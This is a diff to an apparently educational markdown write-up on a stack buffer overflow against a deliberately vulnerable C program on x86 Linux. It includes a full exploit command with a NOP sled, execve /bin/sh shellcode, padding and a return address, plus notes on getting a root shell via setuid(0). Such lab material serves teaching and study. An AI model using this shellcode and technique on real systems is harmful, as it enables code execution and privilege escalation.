@@ -1,6 +1,6 @@
-# Stack based buffer-overflow on Cent OS(or any x84 linux OS)
+# Stack based buffer-overflow on Cent OS( any x84 linux OS )
 
-Stack grows from high address to low address (while buffer grows from low - high address) 
+Stack grows from high address to low address (while buffer grows from low - high address).
 
 Vuln.c is a c program that has a function strcopy (buf, name) that will allow more read of bytes than the buffer size (100) from the second argument.
 
@@ -71,7 +71,7 @@ Prepared 25 byte long shell code which tells VM to launch a shell: \x31\xc0\x50\
 ```python
 ./vuln $(python -c 'print "\x90"*40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*37 + "\x20\xea\xff\xbf"')
 ```
-( 37 As was the right amount! )
+( 37 As was the right amount for test run! )... Not 47. (But, try arbitrary As here)
 
 Note that above part have code execution but not root shell access. It happens due to the protection in /bin/bash. We remove the restriction by:
 setuid(0) + setgid(0) + execve("/bin/sh", ["/bin/sh", NULL])
